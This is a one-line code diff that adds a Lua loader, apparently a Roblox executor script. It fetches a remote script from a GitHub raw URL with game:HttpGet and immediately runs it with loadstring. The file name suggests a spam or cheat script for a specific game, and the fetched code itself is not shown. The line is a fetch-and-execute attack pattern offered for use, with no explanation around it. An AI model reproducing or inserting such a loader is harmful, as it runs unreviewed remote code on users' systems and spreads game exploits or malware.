@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/cure-violence-district-spam4-pgfz0fishqaj5h.lua"))()
